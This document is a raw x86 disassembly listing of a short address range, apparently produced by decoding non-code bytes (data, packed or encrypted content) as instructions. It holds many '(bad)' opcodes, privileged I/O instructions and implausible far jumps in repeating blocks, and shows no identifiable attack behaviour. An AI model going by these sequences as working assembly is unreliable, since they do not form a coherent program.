  40e9ae:	xor    BYTE PTR [ebx+0x0],al
  40e9b1:	add    BYTE PTR [eax],al
  40e9b3:	inc    ecx
  40e9b4:	inc    eax
  40e9b5:	bound  esp,QWORD PTR [esi+0x0]
  40e9b8:	inc    eax
  40e9b9:	add    eax,0x5400000
  40e9be:	inc    ecx
  40e9bf:	inc    eax
  40e9c0:	inc    eax
  40e9c1:	bound  esp,QWORD PTR ds:0x25050043
  40e9c7:	inc    ecx
  40e9c8:	inc    ebx
  40e9c9:	inc    eax
  40e9ca:	test   BYTE PTR [eax+0x0],al
  40e9cd:	bound  ebx,QWORD PTR [eax+0x62]
  40e9d0:	inc    ecx
  40e9d1:	inc    eax
  40e9d2:	rol    BYTE PTR [ecx+0x34],cl
  40e9d5:	ins    BYTE PTR es:[edi],dx
  40e9d6:	mov    gs,WORD PTR [edi+0x2d050541]
  40e9dc:	add    BYTE PTR [edx],bl
  40e9de:	xchg   DWORD PTR [edx],esp
  40e9e0:	pusha  
  40e9e1:	pop    ds
  40e9e2:	xchg   BYTE PTR [eax+eiz*4],bh
  40e9e5:	inc    ebx
  40e9e6:	dec    esp
  40e9e7:	inc    ecx
  40e9e8:	add    ebx,DWORD PTR [ecx+0x21]
  40e9eb:	push   edx
  40e9ec:	ret    
  40e9ed:	(bad)
  40e9f0:	and    al,0xe6
  40e9f2:	shl    esp,1
  40e9f4:	push   eax
  40e9f5:	loopne 0x40e9d5
  40e9f7:	adc    BYTE PTR [edx+0x40],ah
  40e9fa:	inc    ecx
  40e9fb:	and    eax,0x40000500
  40ea00:	inc    ebx
  40ea01:	add    eax,0x40624041
  40ea06:	inc    ebx
  40ea07:	add    eax,0x43402541
  40ea0c:	bound  eax,QWORD PTR [eax+0x43]
  40ea0f:	int3   
  40ea10:	inc    eax
  40ea11:	bound  eax,QWORD PTR [eax]
  40ea13:	inc    ecx
  40ea14:	inc    eax
  40ea15:	inc    eax
  40ea16:	add    eax,0x47604605
  40ea1b:	add    eax,0xb0e70505
  40ea20:	loope  0x40ea38
  40ea22:	rol    BYTE PTR [esi+0x382acb0a],0x34
  40ea29:	inc    eax
  40ea2a:	fwait
  40ea2b:	xor    BYTE PTR [edx],bh
  40ea2d:	dec    esp
  40ea2e:	mov    esi,DWORD PTR [ecx-0x2f06eddf]
  40ea34:	bound  eax,QWORD PTR [esi+0x28]
  40ea37:	xlat   BYTE PTR ds:[ebx]
  40ea38:	push   esp
  40ea39:	push   0x479a053d
  40ea3e:	xor    al,ch
  40ea40:	and    DWORD PTR [eax+0x4a],eax
  40ea43:	xchg   ah,al
  40ea45:	fadd   DWORD PTR [ebx-0x17]
  40ea48:	imul   eax,DWORD PTR ds:0xa94f2dcc,0x62737d40
  40ea52:	inc    eax
  40ea53:	and    eax,0x5406600
  40ea58:	inc    ebx
  40ea59:	inc    ecx
  40ea5a:	inc    eax
  40ea5b:	inc    eax
  40ea5c:	inc    ebx
  40ea5d:	add    BYTE PTR [eax],al
  40ea5f:	add    BYTE PTR [edx-0x34],ah
  40ea62:	inc    eax
  40ea63:	add    eax,0x40004041
  40ea68:	inc    ecx
  40ea69:	int3   
  40ea6a:	add    BYTE PTR [ebx-0x7c],al
  40ea6d:	add    eax,0x5406240
  40ea72:	bound  ebx,QWORD PTR [ecx+0x6b]
  40ea75:	iret   
  40ea76:	in     eax,0x47
  40ea78:	and    al,0x7e
  40ea7a:	lock pusha 
  40ea7c:	adc    DWORD PTR ds:0x216cd90b,eax
  40ea82:	rol    BYTE PTR gs:[bp-0x529a],1
  40ea88:	xor    al,0x59
  40ea8a:	fdivr  QWORD PTR [ebx-0x2e]
  40ea8d:	das    
  40ea8e:	or     eax,0xe3454328
  40ea93:	bound  edi,QWORD PTR [eax-0x32]
  40ea96:	cmp    al,0x40
  40ea98:	(bad)
  40ea9b:	bound  ebx,QWORD PTR [eax+0x41]
  40ea9e:	add    eax,0x40404340
  40eaa3:	inc    ebx
  40eaa4:	inc    eax
  40eaa5:	test   BYTE PTR [eax],al
  40eaa7:	add    eax,0x40624041
  40eaac:	inc    eax
  40eaad:	add    BYTE PTR [edx+0x5],ah
  40eab0:	inc    ebx
  40eab1:	add    BYTE PTR [eax+0x78],al
  40eab4:	inc    ecx
  40eab5:	add    BYTE PTR [eax+0x41],bl
  40eab8:	bound  edi,QWORD PTR [edi]
  40eaba:	es int 0x5
  40eabd:	mov    BYTE PTR [edx],ch
  40eabf:	push   0x52
  40eac1:	imul   ecx,DWORD PTR [eax-0x28],0xffffff86
  40eac5:	jl     0x40eb08
  40eac7:	mov    al,0x28
  40eac9:	and    esp,ebx
  40eacb:	push   0x565823
  40ead0:	fild   DWORD PTR cs:[ecx+0x63]
  40ead4:	int    0x4e
  40ead6:	ficomp DWORD PTR [bp+di]
  40ead9:	loope  0x40ea7b
  40eadb:	lods   al,BYTE PTR ds:[esi]
  40eadc:	add    eax,0xf228ce52
  40eae1:	inc    esp
  40eae2:	imul   eax,DWORD PTR [eax-0x7c],0x0
  40eae6:	int3   
  40eae7:	bound  eax,QWORD PTR ds:0xcc840f41
  40eaed:	inc    ebx
  40eaee:	add    BYTE PTR [eax+0x0],al
  40eaf1:	inc    eax
  40eaf2:	inc    eax
  40eaf3:	inc    eax
  40eaf4:	int3   
  40eaf5:	add    BYTE PTR ds:0x62404341,al
  40eafb:	pop    eax
  40eafc:	add    BYTE PTR [ebx+0x40],al
  40eaff:	bound  ecx,QWORD PTR [edi]
  40eb01:	inc    eax
  40eb02:	add    eax,0x2ca84786
  40eb07:	dec    eax
  40eb08:	popa   
  40eb09:	and    ebx,ecx
  40eb0b:	push   0x7c431e68
  40eb10:	adc    DWORD PTR [ecx+0x44],eax
  40eb13:	int3   
  40eb14:	push   edx
  40eb15:	ss inc eax
  40eb17:	inc    ebx
  40eb18:	and    esp,DWORD PTR [eax+0x2a]
  40eb1b:	add    eax,0x2e246944
  40eb20:	pop    ebp
  40eb21:	outs   dx,BYTE PTR ds:[esi]
  40eb22:	inc    esp
  40eb23:	xchg   BYTE PTR [eax+0x58],dh
  40eb26:	ins    BYTE PTR es:[edi],dx
  40eb27:	sub    eax,0x602a72a1
  40eb2c:	iret   
  40eb2d:	data16 into 
  40eb2f:	retf   0x601d
  40eb32:	lods   al,BYTE PTR ds:[esi]
  40eb33:	retf   
  40eb34:	repnz add BYTE PTR [eax],al
  40eb37:	inc    eax
  40eb38:	inc    eax
  40eb39:	cmovno eax,DWORD PTR ds:0x40056243
  40eb40:	int3   
  40eb41:	add    ah,cl
  40eb43:	inc    eax
  40eb44:	inc    eax
  40eb45:	bound  eax,QWORD PTR [ecx+0x0]
  40eb48:	add    BYTE PTR [edi],cl
  40eb4a:	inc    ebx
  40eb4b:	inc    eax
  40eb4c:	inc    eax
  40eb4d:	add    BYTE PTR [ecx+0x43],al
  40eb50:	add    eax,0x40256240
  40eb55:	bound  eax,QWORD PTR [eax]
  40eb57:	(bad)  
  40eb58:	inc    ebx
  40eb59:	sbb    eax,0x5157ee3
  40eb5e:	push   edx
  40eb5f:	sbb    ch,al
  40eb61:	jecxz  0x40eb57
  40eb63:	jg     0x40eb2e
  40eb65:	xchg   BYTE PTR [ebx+0x64],al
  40eb68:	popa   
  40eb69:	pop    ds
  40eb6a:	and    DWORD PTR [ecx+0x5241704c],esp
  40eb70:	push   ds
  40eb71:	add    eax,0x4140cc00
  40eb76:	inc    eax
  40eb77:	inc    ebx
  40eb78:	bound  esp,QWORD PTR ds:0x41400043
  40eb7e:	add    BYTE PTR [eax],al
  40eb80:	add    eax,0x43624062
  40eb85:	inc    ecx
  40eb86:	inc    eax
  40eb87:	inc    eax
  40eb88:	inc    eax
  40eb89:	add    eax,0x40624340
  40eb8e:	add    eax,0x40664140
  40eb93:	push   0xfffffff0
  40eb95:	imul   edx,DWORD PTR ds:0x9d49f5ca,0xcd6fe3e3
  40eb9f:	add    eax,0x9bbb2532
  40eba4:	mov    edi,0xa8867543
  40eba9:	push   eax
  40ebaa:	sub    BYTE PTR [esi+0x6e4ba26a],dl
  40ebb0:	adc    BYTE PTR [eax+0x28],al
  40ebb3:	sub    ah,cl
  40ebb5:	pop    ss
  40ebb6:	pop    esp
  40ebb7:	leave  
  40ebb8:	hlt    
  40ebb9:	push   0x43
  40ebbb:	lahf   
  40ebbc:	push   eax
  40ebbd:	jl     0x40ebf3
  40ebbf:	add    eax,0x4940c705
  40ebc4:	and    DWORD PTR [esi+0xa],esp
  40ebc7:	xchg   ch,cl
  40ebc9:	ins    BYTE PTR es:[edi],dx
  40ebca:	and    al,0xdd
  40ebcc:	inc    ebx
  40ebcd:	add    BYTE PTR ds:0x41107840,al
  40ebd3:	bound  eax,QWORD PTR [eax+0x40]
  40ebd6:	sldt   WORD PTR [eax-0x34]
  40ebda:	js     0x40ec3e
  40ebdc:	add    eax,0x40664143
  40ebe1:	inc    ebx
  40ebe2:	add    BYTE PTR [ecx+0x5],al
  40ebe5:	js     0x40ec27
  40ebe7:	bound  eax,QWORD PTR [eax+0x0]
  40ebea:	inc    eax
  40ebeb:	adc    DWORD PTR [ebp+0x28],ebp
  40ebee:	jne    0x40eba0
  40ebf0:	arpl   WORD PTR [edi+ebx*2+0x67],bp
  40ebf4:	gs ret 0xcbc8
  40ebf8:	cwde   
  40ebf9:	call   0xb52334d3
  40ebfe:	add    eax,0x5a43a845
  40ec03:	mov    ds:0x43864a7a,eax
  40ec08:	imul   eax,ebp,0x4e
  40ec0b:	loop   0x40ec54
  40ec0d:	into   
  40ec0e:	outs   dx,DWORD PTR ds:[esi]
  40ec0f:	in     al,dx
  40ec10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec11:	stos   WORD PTR es:[edi],ax
  40ec13:	and    DWORD PTR fs:[edx-0x39],edi
  40ec17:	shl    BYTE PTR [edx-0x47],0xef
  40ec1b:	and    DWORD PTR [ebp+eiz*2+0x5],eax
  40ec1f:	test   al,0xb
  40ec21:	or     bl,BYTE PTR [ebp-0x37]
  40ec24:	and    edx,DWORD PTR [ecx+eax*2+0x5404043]
  40ec2b:	bound  eax,QWORD PTR [ecx+0x43]
  40ec2e:	add    BYTE PTR [eax+0x0],al
  40ec31:	bound  eax,QWORD PTR ds:0x40621040
  40ec37:	inc    ebx
  40ec38:	inc    ecx
  40ec39:	add    eax,0x4340
  40ec3e:	add    eax,0x404162
  40ec43:	add    BYTE PTR [eax+0x43],al
  40ec46:	inc    eax
  40ec47:	add    eax,0x4bf51286
  40ec4c:	and    ebp,DWORD PTR [ecx+0x4c21636c]
  40ec52:	pop    ebp
  40ec53:	sub    BYTE PTR [edi+0x67],ch
  40ec56:	loope  0x40ecbe
  40ec58:	(bad)  
  40ec59:	adc    eax,0xe1f62465
  40ec5e:	push   edx
  40ec5f:	dec    edx
  40ec60:	add    eax,0x3435042
  40ec65:	mov    ebx,0x2c86cda3
  40ec6a:	or     eax,0x2f12c540
  40ec6f:	jg     0x40ec9d
  40ec71:	pop    eax
  40ec72:	retf   
  40ec73:	and    al,0x37
  40ec75:	gs pop edx
  40ec77:	jne    0x40ec3e
  40ec79:	arpl   WORD PTR [esi],dx
  40ec7b:	ins    BYTE PTR es:[edi],dx
  40ec7c:	out    0x73,al
  40ec7e:	arpl   WORD PTR [eax+0x0],ax
  40ec81:	add    BYTE PTR [ecx+0x43],al
  40ec84:	add    eax,0x41784062
  40ec89:	inc    eax
  40ec8a:	inc    eax
  40ec8b:	add    BYTE PTR [edi],cl
  40ec8d:	bound  eax,QWORD PTR [ebx+0x0]
  40ec90:	add    eax,0x25006240
  40ec95:	inc    eax
  40ec96:	add    eax,0x40254143
  40ec9b:	add    eax,0x70620000
  40eca0:	add    eax,0xa382ab6c
  40eca5:	and    dl,BYTE PTR [ebx+0x62]
  40eca8:	xchg   BYTE PTR [eax+0x32b443b8],bh
  40ecae:	jecxz  0x40ed0d
  40ecb0:	sub    al,0x64
  40ecb2:	add    eax,0x443fcc5
  40ecb7:	cmp    al,0xc4
  40ecb9:	inc    eax
  40ecba:	leave  
  40ecbb:	sub    ch,BYTE PTR [eax+0x22]
  40ecbe:	fs pop ecx
  40ecc0:	add    eax,0x4ef04c04
  40ecc5:	and    dh,BYTE PTR [esp+edx*4]
  40ecc8:	xchg   BYTE PTR [edx+0x46],ch
  40eccb:	mov    BYTE PTR [eax+0x29541344],dh
  40ecd1:	fdivr  QWORD PTR [esp+eiz*4]
  40ecd4:	fwait
  40ecd5:	mov    eax,ds:0x72c315a1
  40ecda:	rol    BYTE PTR [ebx+0x0],1
  40ecdd:	add    BYTE PTR [eax],al
  40ecdf:	inc    ecx
  40ece0:	inc    eax
  40ece1:	bound  esp,QWORD PTR [esi+0x0]
  40ece4:	inc    eax
  40ece5:	add    eax,0x5400000
  40ecea:	inc    ecx
  40eceb:	inc    eax
  40ecec:	inc    eax
  40eced:	bound  esp,QWORD PTR ds:0x25050043
  40ecf3:	inc    ecx
  40ecf4:	inc    ebx
  40ecf5:	inc    eax
  40ecf6:	test   BYTE PTR [eax+0x0],al
  40ecf9:	bound  ebx,QWORD PTR [eax+0x62]
  40ecfc:	inc    ecx
  40ecfd:	inc    eax
  40ecfe:	sub    ah,cl
  40ed00:	dec    edx
  40ed01:	xor    ebp,ebx
  40ed03:	add    eax,0x8b209471
  40ed08:	mov    ds:0x63869460,eax
  40ed0d:	test   al,0x43
  40ed0f:	pop    edi
  40ed10:	dec    ebx
  40ed11:	fdivr  DWORD PTR es:[edx]
  40ed14:	inc    ecx
  40ed15:	outs   dx,BYTE PTR ds:[esi]
  40ed16:	inc    eax
  40ed17:	cmp    esp,DWORD PTR [ecx+0x54c26a43]
  40ed1d:	jmp    0x541:0xe2973024
  40ed24:	push   0x63
  40ed26:	ins    BYTE PTR es:[edi],dx
  40ed27:	pop    esp
  40ed28:	popa   
  40ed29:	lods   eax,DWORD PTR ds:[esi]
  40ed2a:	lods   al,BYTE PTR ds:[esi]
  40ed2b:	xchg   dh,ch
  40ed2d:	mov    esp,0x26e3779c
  40ed32:	xchg   edi,eax
  40ed33:	das    
  40ed34:	test   al,0x1a
  40ed36:	inc    ebx
  40ed37:	pop    ds
  40ed38:	ja     0x40ed94
  40ed3a:	adc    BYTE PTR [edx+0x40],ah
  40ed3d:	inc    ecx
  40ed3e:	and    eax,0x40000500
  40ed43:	inc    ebx
  40ed44:	add    eax,0x40624041
  40ed49:	inc    ebx
  40ed4a:	add    eax,0x43402541
  40ed4f:	bound  eax,QWORD PTR [eax+0x43]
  40ed52:	int3   
  40ed53:	inc    eax
  40ed54:	bound  eax,QWORD PTR [eax]
  40ed56:	inc    ecx
  40ed57:	inc    eax
  40ed58:	inc    eax
  40ed59:	add    eax,0x7bc13c05
  40ed5e:	sbb    eax,0xe1ff05c5
  40ed63:	arpl   WORD PTR ds:0xaa9662ae,ax
  40ed69:	push   ecx
  40ed6a:	inc    ebp
  40ed6b:	inc    edx
  40ed6c:	xchg   BYTE PTR [edx+0x35],ah
  40ed6f:	sub    DWORD PTR [ebp+0xd9c61a1],0x64
  40ed76:	cld    
  40ed77:	cmp    bh,BYTE PTR [edi]
  40ed79:	inc    ebp
  40ed7a:	cs pop ebp
  40ed7c:	shl    BYTE PTR [edx+eiz*2],0x58
  40ed80:	xor    ah,BYTE PTR [ecx]
  40ed82:	arpl   WORD PTR [eax+0x28808005],bp
  40ed88:	pusha  
  40ed89:	ja     0x40ede1
  40ed8b:	add    DWORD PTR [esi+0x4062c5c5],eax
  40ed91:	and    eax,0x5406600
  40ed96:	inc    ebx
  40ed97:	inc    ecx
  40ed98:	inc    eax
  40ed99:	inc    eax
  40ed9a:	inc    ebx
  40ed9b:	add    BYTE PTR [eax],al
  40ed9d:	add    BYTE PTR [edx-0x34],ah
  40eda0:	inc    eax
  40eda1:	add    eax,0x40004041
  40eda6:	inc    ecx
  40eda7:	int3   
  40eda8:	add    BYTE PTR [ebx-0x7c],al
  40edab:	add    eax,0x5406240
  40edb0:	bound  ebx,QWORD PTR [esp+esi*1]
  40edb3:	cmp    eax,0x4c403282
  40edb8:	inc    esp
  40edb9:	inc    ebx
  40edba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edbb:	pop    es
  40edbc:	and    al,0x44
  40edbe:	inc    eax
  40edbf:	inc    edx
  40edc0:	mov    eax,0x6da93544
  40edc5:	inc    esi
  40edc6:	inc    edx
  40edc7:	jge    0x40eda8
  40edc9:	dec    esp
  40edca:	sub    BYTE PTR [ecx-0x7f],ch
  40edcd:	leave  
  40edce:	inc    eax
  40edcf:	cld    
  40edd0:	dec    esp
  40edd1:	imul   ecx,edx,0x22
  40edd4:	push   0x586240d9
  40edd9:	inc    ecx
  40edda:	add    eax,0x40404340
  40eddf:	inc    ebx
  40ede0:	inc    eax
  40ede1:	test   BYTE PTR [eax],al
  40ede3:	add    eax,0x40624041
  40ede8:	inc    eax
  40ede9:	add    BYTE PTR [edx+0x5],ah
  40edec:	inc    ebx
  40eded:	add    BYTE PTR [eax+0x78],al
  40edf0:	inc    ecx
  40edf1:	add    BYTE PTR [eax+0x41],bl
  40edf4:	(bad)  
  40edf5:	lds    esp,FWORD PTR [ebx-0xb]
  40edf8:	mov    dl,0x1f
  40edfa:	mov    bl,0x2
  40edfc:	test   al,0x4f
  40edfe:	scas   al,BYTE PTR es:[edi]
  40edff:	cdq    
  40ee00:	mov    dh,0xef
  40ee02:	mov    esi,0x2280043b
  40ee07:	bound  eax,QWORD PTR [ebx+0x7]
  40ee0a:	inc    ebx
  40ee0b:	sub    DWORD PTR [edx],esp
  40ee0d:	vpmulhuw ymm0,ymm5,ymm6
  40ee11:	mul    cl
  40ee13:	xor    BYTE PTR [esp+edx*2+0x53],al
  40ee17:	xor    BYTE PTR [esi],bl
  40ee19:	pop    ebp
  40ee1a:	pop    esi
  40ee1b:	add    eax,DWORD PTR [eax+eax*2-0xccf20d0]
  40ee22:	and    ebp,DWORD PTR [esi+0x64884038]
  40ee28:	enter  0x1226,0xb
  40ee2c:	into   
  40ee2d:	inc    eax
  40ee2e:	bound  edx,QWORD PTR [ebp+0x40]
  40ee31:	test   BYTE PTR [eax],al
  40ee33:	int3   
  40ee34:	bound  eax,QWORD PTR ds:0xcc840f41
  40ee3a:	inc    ebx
  40ee3b:	add    BYTE PTR [eax+0x0],al
  40ee3e:	inc    eax
  40ee3f:	inc    eax
  40ee40:	inc    eax
  40ee41:	int3   
  40ee42:	add    BYTE PTR ds:0x62404341,al
  40ee48:	pop    eax
  40ee49:	add    BYTE PTR [ebx+0x40],al
  40ee4c:	bound  ecx,QWORD PTR [edi]
  40ee4e:	inc    eax
  40ee4f:	lods   eax,DWORD PTR ds:[esi]
  40ee50:	call   0x629d:0x5c62b520
  40ee57:	sub    dh,dh
  40ee59:	das    
  40ee5a:	add    eax,0x5a20ec75
  40ee5f:	sbb    BYTE PTR [edi+0x62755849],al
  40ee65:	jle    0x40ee63
  40ee67:	inc    ebx
  40ee68:	dec    ebx
  40ee69:	loope  0x40ee6d
  40ee6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee6c:	test   al,0xc
  40ee6e:	nop
  40ee6f:	inc    eax
  40ee70:	inc    edi
  40ee71:	dec    edx
  40ee72:	and    eax,0xa8636563
  40ee77:	and    al,0x12
  40ee79:	mov    ds:0x213294d1,eax
  40ee7e:	adc    ch,BYTE PTR [esp+ebp*2+0x0]
  40ee82:	add    BYTE PTR [eax+0x40],al
  40ee85:	cmovno eax,DWORD PTR ds:0x40056243
  40ee8c:	int3   
  40ee8d:	add    ah,cl
  40ee8f:	inc    eax
  40ee90:	inc    eax
  40ee91:	bound  eax,QWORD PTR [ecx+0x0]
  40ee94:	add    BYTE PTR [edi],cl
  40ee96:	inc    ebx
  40ee97:	inc    eax
  40ee98:	inc    eax
  40ee99:	add    BYTE PTR [ecx+0x43],al
  40ee9c:	add    eax,0x40256240
  40eea1:	bound  eax,QWORD PTR [eax]
  40eea3:	dec    esp
  40eea4:	add    al,0x0
  40eea6:	imul   edi,DWORD PTR [eax+ecx*2+0x50],0xffffff93
  40eeab:	loope  0x40eec0
  40eead:	fs clc 
  40eeaf:	bound  eax,QWORD PTR [ecx+0x43]
  40eeb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeb3:	add    edi,DWORD PTR [edx]
  40eeb5:	xchg   DWORD PTR [ebx+0x40],esp
  40eeb8:	and    ch,al
  40eeba:	cmp    eax,0x195071a1
  40eebf:	push   eax
  40eec0:	add    eax,0x4140cc00
  40eec5:	inc    eax
  40eec6:	inc    ebx
  40eec7:	bound  esp,QWORD PTR ds:0x41400043
  40eecd:	add    BYTE PTR [eax],al
  40eecf:	add    eax,0x43624062
  40eed4:	inc    ecx
  40eed5:	inc    eax
  40eed6:	inc    eax
  40eed7:	inc    eax
  40eed8:	add    eax,0x40624340
  40eedd:	add    eax,0x40664140
  40eee2:	and    BYTE PTR [edx-0x36ff502f],ah
  40eee8:	fdiv   DWORD PTR [edi]
  40eeea:	fs sub eax,0x5122430d
  40eef0:	bound  edx,QWORD PTR [esi+0x62]
  40eef3:	and    bl,al
  40eef5:	jecxz  0x40eee6
  40eef7:	retf   
  40eef8:	inc    edx
  40eef9:	sbb    ch,BYTE PTR fs:[bx+si+0x171]
  40eeff:	inc    edx
  40ef00:	sbb    edx,DWORD PTR [eax]
  40ef02:	bound  ebp,QWORD PTR [eax]
  40ef04:	jb     0x40ef29
  40ef06:	inc    ebp
  40ef07:	and    eax,0x1457e1a9
  40ef0c:	test   BYTE PTR [ecx+eax*4-0x48],0xb8
  40ef11:	stc    
  40ef12:	inc    ebx
  40ef13:	add    BYTE PTR ds:0x41107840,al
  40ef19:	bound  eax,QWORD PTR [eax+0x40]
  40ef1c:	sldt   WORD PTR [eax-0x34]
  40ef20:	js     0x40ef84
  40ef22:	add    eax,0x40664143
  40ef27:	inc    ebx
  40ef28:	add    BYTE PTR [ecx+0x5],al
  40ef2b:	js     0x40ef6d
  40ef2d:	bound  eax,QWORD PTR [eax+0x0]
  40ef30:	inc    eax
  40ef31:	nop
  40ef32:	inc    ebx
  40ef33:	retf   
  40ef34:	in     eax,0x1e
  40ef36:	bound  eax,QWORD PTR [ecx+0x52]
  40ef39:	pop    ebx
  40ef3a:	inc    eax
  40ef3b:	cmp    al,0x50
  40ef3d:	add    al,0xfc
  40ef3f:	push   esi
  40ef40:	ret    
  40ef41:	mov    BYTE PTR [ecx+eax*8],ah
  40ef44:	mov    eax,ds:0x4ca8a02c
  40ef49:	cmc    
  40ef4a:	ins    BYTE PTR es:[edi],dx
  40ef4b:	sub    DWORD PTR [ecx],edx
  40ef4d:	inc    ebp
  40ef4e:	bound  edi,QWORD PTR [edi+0xd]
  40ef51:	and    al,0x6a
  40ef53:	in     al,dx
  40ef54:	add    BYTE PTR gs:[esp+ebx*1+0x53],al
  40ef59:	test   eax,0xb6490f46
  40ef5e:	test   al,0x63
  40ef60:	mov    eax,0x404341b8
  40ef65:	inc    eax
  40ef66:	add    eax,0x434162
  40ef6b:	inc    eax
  40ef6c:	add    BYTE PTR [edx+0x5],ah
  40ef6f:	inc    eax
  40ef70:	adc    BYTE PTR [edx+0x40],ah
  40ef73:	inc    ebx
  40ef74:	inc    ecx
  40ef75:	add    eax,0x4340
  40ef7a:	add    eax,0x404162
  40ef7f:	add    BYTE PTR [eax+0x43],al
  40ef82:	inc    eax
  40ef83:	add    eax,0xfa612acd
  40ef88:	cmp    eax,0x985d0508
  40ef8d:	mov    ecx,0x74c33043
  40ef92:	inc    ebx
  40ef93:	jle    0x40ef28
  40ef95:	push   ebx
  40ef96:	loopne 0x40ef99
  40ef98:	arpl   WORD PTR [ebx+0x60],sp
  40ef9b:	push   0xfe2912df
  40efa0:	inc    edx
  40efa1:	rcl    bh,0x73
  40efa4:	dec    ecx
  40efa5:	mov    ebx,0x785d01be
  40efaa:	push   esp
  40efab:	cmp    al,0x28
  40efad:	aam    0x4c
  40efaf:	pop    ecx
  40efb0:	and    al,0xbd
  40efb2:	mov    ah,0x9a
  40efb4:	adc    BYTE PTR [esi+0x40a1],cl
  40efba:	inc    ecx
  40efbb:	inc    ebx
  40efbc:	add    eax,0x41784062
  40efc1:	inc    eax
  40efc2:	inc    eax
  40efc3:	add    BYTE PTR [edi],cl
  40efc5:	bound  eax,QWORD PTR [ebx+0x0]
  40efc8:	add    eax,0x25006240
  40efcd:	inc    eax
  40efce:	add    eax,0x40254143
  40efd3:	add    eax,0x3620000
  40efd8:	inc    ebp
  40efd9:	arpl   WORD PTR [eax-0x3a09bc6c],bp
  40efdf:	adc    ah,0x64
  40efe2:	adc    dl,BYTE PTR [eax+0x40]
  40efe5:	push   eax
  40efe6:	in     eax,0x81
  40efe8:	mov    esp,0x24578c30
  40efed:	xchg   edx,eax
  40efee:	dec    ecx
  40efef:	jmp    FWORD PTR [eax+0x6cdd15b0]
  40eff5:	mov    al,ds:0x51203a1
  40effa:	int    0x43
  40effc:	add    al,0x94
  40effe:	ror    DWORD PTR [edx-0x48],cl
  40f001:	retf   
  40f002:	push   esp
  40f003:	pusha  
  40f004:	push   0x43
  40f006:	add    BYTE PTR [eax],al
  40f008:	add    BYTE PTR [ecx+0x40],al
  40f00b:	bound  esp,QWORD PTR [esi+0x0]
  40f00e:	inc    eax
  40f00f:	add    eax,0x5400000
  40f014:	inc    ecx
  40f015:	inc    eax
  40f016:	inc    eax
  40f017:	bound  esp,QWORD PTR ds:0x25050043
  40f01d:	inc    ecx
  40f01e:	inc    ebx
  40f01f:	inc    eax
  40f020:	test   BYTE PTR [eax+0x0],al
  40f023:	bound  ebx,QWORD PTR [eax+0x62]
  40f026:	inc    ecx
  40f027:	inc    eax
  40f028:	add    DWORD PTR [ecx+0x35504101],esp
  40f02e:	addr16 in eax,0xe5
  40f031:	imul   edi,DWORD PTR ds:0xfe45cf99,0x2d
  40f038:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f039:	and    eax,0xffc1e802
  40f03e:	enter  0xa46c,0x38
  40f042:	and    ah,BYTE PTR [edx-0x6]
  40f045:	dec    eax
  40f046:	fistp  DWORD PTR [ebx-0x69]
  40f049:	and    al,0xbe
  40f04b:	gs test al,0x52
  40f04e:	sub    al,0x28
  40f050:	or     BYTE PTR [esp+edx*4],ah
  40f053:	test   BYTE PTR [ecx],dl
  40f055:	cmp    ch,0xc
  40f058:	mov    WORD PTR [edx-0x7d],es
  40f05b:	bound  eax,QWORD PTR [ecx-0x78]
  40f05e:	mov    al,0x42
  40f060:	mov    esi,0x6210ffe1
  40f065:	inc    eax
  40f066:	inc    ecx
  40f067:	and    eax,0x40000500
  40f06c:	inc    ebx
  40f06d:	add    eax,0x40624041
  40f072:	inc    ebx
  40f073:	add    eax,0x43402541
  40f078:	bound  eax,QWORD PTR [eax+0x43]
  40f07b:	int3   
  40f07c:	inc    eax
  40f07d:	bound  eax,QWORD PTR [eax]
  40f07f:	inc    ecx
  40f080:	inc    eax
  40f081:	inc    eax
  40f082:	add    eax,0x1b7f4305
  40f087:	pop    ecx
  40f088:	inc    eax
  40f089:	idiv   DWORD PTR [ebp-0x7f5b1b7d]
  40f08f:	and    BYTE PTR [ebx+ebp*8],0x49
  40f093:	sbb    ch,BYTE PTR [edi+0x62]
  40f096:	stos   BYTE PTR es:[edi],al
  40f097:	sub    BYTE PTR [eax+ebx*1-0x5f],ch
  40f09b:	add    esp,DWORD PTR [ecx+0x6e]
  40f09e:	inc    esi
  40f09f:	leave  
  40f0a0:	push   ds
  40f0a1:	push   esi
  40f0a2:	inc    esp
  40f0a3:	dec    edx
  40f0a4:	mov    esp,ds
  40f0a6:	leave  
  40f0a7:	pop    ecx
  40f0a8:	inc    ebx
  40f0a9:	xchg   esp,eax
  40f0aa:	mov    ds:0xa8b01d81,al
  40f0af:	and    al,ch
  40f0b1:	xchg   BYTE PTR [ebx],dh
  40f0b3:	into   
  40f0b4:	pop    ebp
  40f0b5:	adc    al,BYTE PTR [esi-0x50]
  40f0b8:	mov    bh,0x62
  40f0ba:	inc    eax
  40f0bb:	and    eax,0x5406600
  40f0c0:	inc    ebx
  40f0c1:	inc    ecx
  40f0c2:	inc    eax
  40f0c3:	inc    eax
  40f0c4:	inc    ebx
  40f0c5:	add    BYTE PTR [eax],al
  40f0c7:	add    BYTE PTR [edx-0x34],ah
  40f0ca:	inc    eax
  40f0cb:	add    eax,0x40004041
  40f0d0:	inc    ecx
  40f0d1:	int3   
  40f0d2:	add    BYTE PTR [ebx-0x7c],al
  40f0d5:	add    eax,0x5406240
  40f0da:	(bad)  
  40f0db:	lds    ecx,FWORD PTR [ecx+eax*4+0x25]
  40f0df:	sub    eax,0xb23515a9
  40f0e4:	mov    eax,ds:0xa662ad1c
  40f0e9:	pop    edx
  40f0ea:	mov    ebx,0x8001737f
  40f0ef:	or     dh,al
  40f0f1:	mov    dh,0x87
  40f0f3:	(bad)  
  40f0f4:	popa   
  40f0f5:	and    DWORD PTR [ebx+0x2c],0x12847f1
  40f0fc:	inc    ecx
  40f0fd:	or     DWORD PTR [edx+0x81a5662],ebx
  40f103:	mov    ebp,0x19a849a1
  40f108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f109:	lods   eax,DWORD PTR ds:[esi]
  40f10a:	inc    ebx
  40f10b:	and    al,0x61
  40f10d:	add    DWORD PTR [edx-0x4c],eax
  40f110:	or     eax,0x615e4063
  40f115:	mov    edi,0x41586240
  40f11a:	add    eax,0x40404340
  40f11f:	inc    ebx
  40f120:	inc    eax
  40f121:	test   BYTE PTR [eax],al
  40f123:	add    eax,0x40624041
  40f128:	inc    eax
  40f129:	add    BYTE PTR [edx+0x5],ah
  40f12c:	inc    ebx
